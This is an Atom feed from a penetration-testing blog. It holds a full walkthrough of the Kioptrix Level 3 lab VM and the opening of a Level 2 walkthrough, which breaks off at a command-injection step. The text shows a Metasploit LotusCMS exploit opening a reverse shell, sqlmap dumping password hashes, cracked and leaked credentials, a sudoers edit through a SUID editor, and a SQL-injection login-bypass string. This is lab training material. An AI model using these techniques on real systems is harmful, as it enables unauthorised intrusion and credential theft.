<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Core dump overflow]]></title>
  <link href="http://chousensha.github.io/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2014-06-22T21:37:47+03:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 3]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/20/pentest-lab-kioptrix-level-3/"/>
    <updated>2014-06-20T23:53:34+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/20/pentest-lab-kioptrix-level-3</id>
    <content type="html"><![CDATA[<p>Next in the Kioptrix series is level 3.</p>

<p><strong>Important</strong></p>

<p>With the VM there is a README.txt file that says you should update your hosts file with the VM&rsquo;s IP and hostname, which is <em>kioptrix3.com</em>. I initially ignored it and on the gallery page, all I could see were some broken images and links that didn&rsquo;t work. I went back and added the entry to my <code>/etc/hosts</code> file, and everything worked fine afterwards.</p>

<!-- more -->


<p>Start by checking out what&rsquo;s being exposed with Nmap:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -A -p1-65535 192.168.127.128
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 ( http://nmap.org ) at 2014-06-20 23:56 EEST
</span><span class='line'>Nmap scan report for 192.168.127.128
</span><span class='line'>Host is up (0.00039s latency).
</span><span class='line'>Not shown: 65533 closed ports
</span><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
</span><span class='line'>|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
</span><span class='line'>80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
</span><span class='line'>|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
</span><span class='line'>|_http-title: Ligoat Security - Got Goat? Security ...
</span><span class='line'>MAC Address: 00:0C:29:07:4F:A9 (VMware)
</span><span class='line'>Device type: general purpose
</span><span class='line'>Running: Linux 2.6.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6
</span><span class='line'>OS details: Linux 2.6.9 - 2.6.33
</span><span class='line'>Network Distance: 1 hop
</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s take a look at what&rsquo;s hosted on the web server. It appears to be a site with a blog page, a gallery and what appears to be an admin login page:</p>

<p><img class="center" src="http://chousensha.github.io/images/lotus_cms.png" title="admin login" alt="login"></p>

<p>I tried running a sqlmap scan against it, with no success. Next, I thought maybe there might be something about the LotusCMS that powers up the site. It turns out there&rsquo;s a remote execution exploit available in Metasploit:</p>

<p><strong>LotusCMS 3.0 eval() Remote Command Execution</strong></p>

<blockquote><p>This module exploits a vulnerability found in Lotus CMS 3.0&rsquo;s Router() function. This is done by embedding PHP code in the &lsquo;page&rsquo; parameter,
which will be passed to a eval call, therefore allowing remote code execution. The module can either automatically pick up a &lsquo;page&rsquo; parameter
from the default page, or manually specify one in the URI option. To use the automatic method, please supply the URI with just a directory path, > for example: &ldquo;/lcms/&rdquo;. To manually configure one, you may do: &ldquo;/lcms/somepath/index.php?page=index&rdquo;</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/http/lcms_php_exec
</span><span class='line'>msf exploit(lcms_php_exec) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/http/lcms_php_exec):
</span><span class='line'>
</span><span class='line'>   Name     Current Setting  Required  Description
</span><span class='line'>   ----     ---------------  --------  -----------
</span><span class='line'>   Proxies                   no        Use a proxy chain
</span><span class='line'>   RHOST                     yes       The target address
</span><span class='line'>   RPORT    80               yes       The target port
</span><span class='line'>   URI      /lcms/           yes       URI
</span><span class='line'>   VHOST                     no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic LotusCMS 3.0
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(lcms_php_exec) &gt; set RHOST 192.168.127.128
</span><span class='line'>RHOST =&gt; 192.168.127.128
</span><span class='line'>msf exploit(lcms_php_exec) &gt; set payload generic/shell_reverse_tcp
</span><span class='line'>payload =&gt; generic/shell_reverse_tcp
</span><span class='line'>msf exploit(lcms_php_exec) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>msf exploit(lcms_php_exec) &gt; set URI /
</span><span class='line'>URI =&gt; /
</span><span class='line'>msf exploit(lcms_php_exec) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on 192.168.127.159:4444 
</span><span class='line'>[*] Using found page param: /index.php?page=index
</span><span class='line'>[*] Sending exploit ...
</span><span class='line'>[*] Command shell session 1 opened (192.168.127.159:4444 -&gt; 192.168.127.128:40623) at 2014-06-22 00:37:23 +0300
</span><span class='line'>whoami
</span><span class='line'>
</span><span class='line'>www-data</span></code></pre></td></tr></table></div></figure>


<p>So we have a shell. I could not find a local privilege escalation exploit right away, so I instead started exploring the system.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pwd
</span><span class='line'>/home/www/kioptrix3.com
</span><span class='line'>ls -l
</span><span class='line'>total 84
</span><span class='line'>drwxrwxrwx  2 root root  4096 Apr 15  2011 cache
</span><span class='line'>drwxrwxrwx  8 root root  4096 Apr 14  2011 core
</span><span class='line'>drwxrwxrwx  8 root root  4096 Apr 14  2011 data
</span><span class='line'>-rw-r--r--  1 root root 23126 Jun  5  2009 favicon.ico
</span><span class='line'>drwxr-xr-x  7 root root  4096 Apr 14  2011 gallery
</span><span class='line'>-rw-r--r--  1 root root 26430 Jan 21  2007 gnu-lgpl.txt
</span><span class='line'>-rw-r--r--  1 root root   399 Feb 23  2011 index.php
</span><span class='line'>drwxrwxrwx 10 root root  4096 Apr 14  2011 modules
</span><span class='line'>drwxrwxrwx  3 root root  4096 Apr 14  2011 style
</span><span class='line'>-rw-r--r--  1 root root   243 Aug  5  2010 update.php</span></code></pre></td></tr></table></div></figure>


<p>The gallery directory looks interesting, so I looked inside:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cd gallery
</span><span class='line'>ls -l
</span><span class='line'>total 156
</span><span class='line'>drwxr-xr-x 2 root root  4096 Apr 12  2011 BACK
</span><span class='line'>-rw-r--r-- 1 root root  3573 Oct 10  2009 db.sql
</span><span class='line'>-rw-r--r-- 1 root root   252 Apr 12  2011 g.php
</span><span class='line'>drwxr-xr-x 3 root root  4096 Apr 12  2011 gadmin
</span><span class='line'>-rw-r--r-- 1 root root   214 Apr 12  2011 gallery.php
</span><span class='line'>-rw-r--r-- 1 root root  1440 Apr 14  2011 gconfig.php
</span><span class='line'>-rw-r--r-- 1 root root   297 Apr 12  2011 gfooter.php
</span><span class='line'>-rw-r--r-- 1 root root 38771 Apr 12  2011 gfunctions.php
</span><span class='line'>-rw-r--r-- 1 root root  1009 Apr 12  2011 gheader.php
</span><span class='line'>-rw-r--r-- 1 root root   249 Apr 12  2011 index.php
</span><span class='line'>-rw-r--r-- 1 root root 10340 Apr 12  2011 install.BAK
</span><span class='line'>-rw-r--r-- 1 root root   212 Apr 12  2011 login.php
</span><span class='line'>-rw-r--r-- 1 root root   213 Apr 12  2011 logout.php
</span><span class='line'>-rw-r--r-- 1 root root   249 Apr 12  2011 p.php
</span><span class='line'>drwxrwxrwx 2 root root  4096 Apr 12  2011 photos
</span><span class='line'>-rw-r--r-- 1 root root   213 Apr 12  2011 photos.php
</span><span class='line'>-rw-r--r-- 1 root root   219 Apr 12  2011 post_comment.php
</span><span class='line'>-rw-r--r-- 1 root root   214 Apr 12  2011 profile.php
</span><span class='line'>-rw-r--r-- 1 root root    87 Oct 10  2009 readme.html
</span><span class='line'>-rw-r--r-- 1 root root   213 Apr 12  2011 recent.php
</span><span class='line'>-rw-r--r-- 1 root root   215 Apr 12  2011 register.php
</span><span class='line'>drwxr-xr-x 2 root root  4096 Apr 13  2011 scopbin
</span><span class='line'>-rw-r--r-- 1 root root   213 Apr 12  2011 search.php
</span><span class='line'>-rw-r--r-- 1 root root   216 Apr 12  2011 slideshow.php
</span><span class='line'>-rw-r--r-- 1 root root   211 Apr 12  2011 tags.php
</span><span class='line'>drwxr-xr-x 6 root root  4096 Apr 12  2011 themes
</span><span class='line'>-rw-r--r-- 1 root root    56 Oct 10  2009 version.txt
</span><span class='line'>-rw-r--r-- 1 root root   211 Apr 12  2011 vote.php</span></code></pre></td></tr></table></div></figure>


<p>So, there&rsquo;s all the source code for the gallery. I checked the files that looked interesting until I came upon a hit on the <code>gconfig.php</code> file, which contains the sort of information we need:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/*
</span><span class='line'>  A sample Gallarific configuration file. You should edit
</span><span class='line'>  the installer details below and save this file as gconfig.php
</span><span class='line'>  Do not modify anything else if you don't know what it is.
</span><span class='line'>*/
</span><span class='line'>
</span><span class='line'>  $GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";
</span><span class='line'>
</span><span class='line'>  $GLOBALS["gallarific_mysql_server"] = "localhost";
</span><span class='line'>  $GLOBALS["gallarific_mysql_database"] = "gallery";
</span><span class='line'>  $GLOBALS["gallarific_mysql_username"] = "root";
</span><span class='line'>  $GLOBALS["gallarific_mysql_password"] = "fuckeyou";</span></code></pre></td></tr></table></div></figure>


<p>I tried SSHing to the box with these credentials and also elevating privileges with su, but that would have been too easy. So more digging in the Php source code. The <code>gfunctions.php</code> file contains a plethora of information, among which there are some table and column names. There might be more information in the Php files but I didn&rsquo;t have the patience to go through all of them.</p>

<p>Back at the gallery, we can see some sorting options:</p>

<p><img class="center" src="http://chousensha.github.io/images/sort.png" title="sort options" alt="sort"></p>

<p>Changing the sort filter to <em>photo id</em> makes the URL look like this:</p>

<p><code><a href="http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos">http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos</a></code></p>

<p>And if I replace the <code>id=1</code> part with <code>id=&lsquo;</code>, the site spits back a SQL error:</p>

<p><em>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &lsquo;&rsquo; order by parentid,sort,name&#8217; at line 1Could not select category</em></p>

<p>Now that I know SQLi is possible, it&rsquo;s time to fire sqlmap again!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" --dbms=MySQL --level=5 --risk=3 --dump
</span><span class='line'>
</span><span class='line'>Database: gallery
</span><span class='line'>Table: dev_accounts
</span><span class='line'>[2 entries]
</span><span class='line'>+----+------------+----------------------------------+
</span><span class='line'>| id | username   | password                         |
</span><span class='line'>+----+------------+----------------------------------+
</span><span class='line'>| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |
</span><span class='line'>| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |
</span><span class='line'>+----+------------+----------------------------------+
</span></code></pre></td></tr></table></div></figure>


<p>It was a bit overkill to dump so much information, but I only show here the important bits. To crack the hashes, I used the <a href="http://www.hashkiller.co.uk/">http://www.hashkiller.co.uk/</a> site:</p>

<p>dreg&rsquo;s password: Mast3r</p>

<p>loneferret&rsquo;s password: starwars</p>

<p>Thankfully, these credentials work for SSH login, so I could get rid of the Metasploit shell which kept throwing EOF errors if I didn&rsquo;t interact with it for a while.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh loneferret@kioptrix3.com
</span><span class='line'>The authenticity of host 'kioptrix3.com (192.168.127.128)' can't be established.
</span><span class='line'>RSA key fingerprint is 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
</span><span class='line'>Warning: Permanently added 'kioptrix3.com' (RSA) to the list of known hosts.
</span><span class='line'>loneferret@kioptrix3.com's password: 
</span><span class='line'>Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
</span><span class='line'>
</span><span class='line'>The programs included with the Ubuntu system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span><span class='line'>applicable law.
</span><span class='line'>
</span><span class='line'>To access official Ubuntu documentation, please visit:
</span><span class='line'>http://help.ubuntu.com/
</span><span class='line'>Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
</span><span class='line'>loneferret@Kioptrix3:~$ </span></code></pre></td></tr></table></div></figure>


<p>In the home directory there&rsquo;s a <code>CompanyPolicy.README</code> file with the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> Hello new employee,
</span><span class='line'> It is company policy here to use our newly installed software for editing, creating and viewing files.
</span><span class='line'> Please use the command 'sudo ht'.
</span><span class='line'> Failure to do so will result in you immediate termination.
</span><span class='line'>
</span><span class='line'> DG
</span><span class='line'> CEO</span></code></pre></td></tr></table></div></figure>


<p>So, let&rsquo;s see what this ht program is all about:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>loneferret@Kioptrix3:~$ whereis ht
</span><span class='line'>ht: /usr/local/bin/ht
</span><span class='line'>loneferret@Kioptrix3:~$ ls -l /usr/local/bin/ht
</span><span class='line'>-rwsr-sr-x 1 root root 2072344 2011-04-16 07:26 /usr/local/bin/ht</span></code></pre></td></tr></table></div></figure>


<p>Looks like a SUID binary! And it seems it&rsquo;s a hex editor that we can use to view and edit any file on the system!</p>

<p><img class="center" src="http://chousensha.github.io/images/ht.png" title="ht" alt="ht"></p>

<p>Ok, I could crack the root password, but there&rsquo;s an easier way, by modifing the <code>/etc/sudoers</code> file. First, I had to look up some information about the ht editor. You need to use the F (function) keys for this one. With F6, I could change the mode to text, making it look less horrible. The easiest way I found to go about it was to open the <code>/etc/sudoers</code> file again, after selecting the text mode. Then I added <em>/bin/bas</em> to loneferret&rsquo;s entry:</p>

<p><img class="center" src="http://chousensha.github.io/images/sudo_bash.png" title="sudo bash" alt="sudo bash"></p>

<p>Now save the file and type <em>sudo bash</em> to get the long waited for root shell. In the /root/ directory there&rsquo;s also a <code>Congrats.txt</code> file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@Kioptrix3:/root# cat Congrats.txt
</span><span class='line'>Good for you for getting here.
</span><span class='line'>Regardless of the matter (staying within the spirit of the game of course)
</span><span class='line'>you got here, congratulations are in order. Wasn't that bad now was it.
</span><span class='line'>
</span><span class='line'>Went in a different direction with this VM. Exploit based challenges are
</span><span class='line'>nice. Helps workout that information gathering part, but sometimes we
</span><span class='line'>need to get our hands dirty in other things as well.
</span><span class='line'>Again, these VMs are beginner and not intented for everyone. 
</span><span class='line'>Difficulty is relative, keep that in mind.
</span><span class='line'>
</span><span class='line'>The object is to learn, do some research and have a little (legal)
</span><span class='line'>fun in the process.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>I hope you enjoyed this third challenge.
</span><span class='line'>
</span><span class='line'>Steven McElrea
</span><span class='line'>aka loneferret
</span><span class='line'>http://www.kioptrix.com
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Credit needs to be given to the creators of the gallery webapp and CMS used
</span><span class='line'>for the building of the Kioptrix VM3 site.
</span><span class='line'>
</span><span class='line'>Main page CMS: 
</span><span class='line'>http://www.lotuscms.org
</span><span class='line'>
</span><span class='line'>Gallery application: 
</span><span class='line'>Gallarific 2.1 - Free Version released October 10, 2009
</span><span class='line'>http://www.gallarific.com
</span><span class='line'>Vulnerable version of this application can be downloaded
</span><span class='line'>from the Exploit-DB website:
</span><span class='line'>http://www.exploit-db.com/exploits/15891/
</span><span class='line'>
</span><span class='line'>The HT Editor can be found here:
</span><span class='line'>http://hte.sourceforge.net/downloads.html
</span><span class='line'>And the vulnerable version on Exploit-DB here:
</span><span class='line'>http://www.exploit-db.com/exploits/17083/
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Also, all pictures were taken from Google Images, so being part of the
</span><span class='line'>public domain I used them.</span></code></pre></td></tr></table></div></figure>


<p>And this was Kioptrix level 3, with another interesting twist.</p>

<blockquote><p>Today is the tomorrow you worried about yesterday.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 2]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/16/pentest-lab-kioptrix-level-2/"/>
    <updated>2014-06-16T22:47:31+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/16/pentest-lab-kioptrix-level-2</id>
    <content type="html"><![CDATA[<p>Today I will walk through exploiting level 2 in the Kioptrix series.</p>

<!-- more -->


<p>Again, I first did a ping sweep with Nmap and determined the IP of the target is 192.168.127.162</p>

<p>Next, the port scan:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -A -p1-65535 192.168.127.162
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 ( http://nmap.org ) at 2014-06-16 22:52 EEST
</span><span class='line'>Nmap scan report for 192.168.127.162
</span><span class='line'>Host is up (0.00036s latency).
</span><span class='line'>Not shown: 65528 closed ports
</span><span class='line'>PORT     STATE SERVICE  VERSION
</span><span class='line'>22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
</span><span class='line'>|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
</span><span class='line'>|_sshv1: Server supports SSHv1
</span><span class='line'>80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
</span><span class='line'>|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
</span><span class='line'>|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
</span><span class='line'>111/tcp  open  rpcbind  2 (RPC #100000)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2            111/tcp  rpcbind
</span><span class='line'>|   100000  2            111/udp  rpcbind
</span><span class='line'>|   100024  1            630/udp  status
</span><span class='line'>|_  100024  1            633/tcp  status
</span><span class='line'>443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
</span><span class='line'>|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
</span><span class='line'>|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
</span><span class='line'>| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
</span><span class='line'>| Not valid before: 2009-10-07T23:10:47+00:00
</span><span class='line'>|_Not valid after:  2010-10-07T23:10:47+00:00
</span><span class='line'>|_ssl-date: 2014-06-16T16:42:47+00:00; -3h09m46s from local time.
</span><span class='line'>| sslv2: 
</span><span class='line'>|   SSLv2 supported
</span><span class='line'>|   ciphers: 
</span><span class='line'>|     SSL2_DES_192_EDE3_CBC_WITH_MD5
</span><span class='line'>|     SSL2_RC2_CBC_128_CBC_WITH_MD5
</span><span class='line'>|     SSL2_RC4_128_WITH_MD5
</span><span class='line'>|     SSL2_RC4_64_WITH_MD5
</span><span class='line'>|     SSL2_DES_64_CBC_WITH_MD5
</span><span class='line'>|     SSL2_RC2_CBC_128_CBC_WITH_MD5
</span><span class='line'>|_    SSL2_RC4_128_EXPORT40_WITH_MD5
</span><span class='line'>631/tcp  open  ipp      CUPS 1.1
</span><span class='line'>| http-methods: Potentially risky methods: PUT
</span><span class='line'>|_See http://nmap.org/nsedoc/scripts/http-methods.html
</span><span class='line'>|_http-title: 403 Forbidden
</span><span class='line'>633/tcp  open  status   1 (RPC #100024)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2            111/tcp  rpcbind
</span><span class='line'>|   100000  2            111/udp  rpcbind
</span><span class='line'>|   100024  1            630/udp  status
</span><span class='line'>|_  100024  1            633/tcp  status
</span><span class='line'>3306/tcp open  mysql    MySQL (unauthorized)
</span><span class='line'>MAC Address: 00:0C:29:20:9D:3E (VMware)
</span><span class='line'>Device type: general purpose
</span><span class='line'>Running: Linux 2.6.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6
</span><span class='line'>OS details: Linux 2.6.9 - 2.6.30</span></code></pre></td></tr></table></div></figure>


<h3>From web to shell</h3>

<p>Pointing the browser to the target, we can see this remote admin login panel:</p>

<p><img class="center" src="http://chousensha.github.io/images/login.png" title="admin login" alt="login"></p>

<p>Immediately thinking SQL injection, I did a quick scan with Owasp Zap and indeed, the login can be bypassed using an injection like the following:</p>

<p><code>&lsquo; or '1&rsquo; = &lsquo;1&rsquo; &mdash; </code></p>

<p>Now we can see an interface where we can ping hosts, which might mean remote code execution:</p>

<p><img class="center" src="http://chousensha.github.io/images/ping.png" title="ping ip" alt="ping"></p>

<p>After testing the ping functionality, I ran a quick <em>uname -a</em> to confirm that remote code execution is possible:</p>

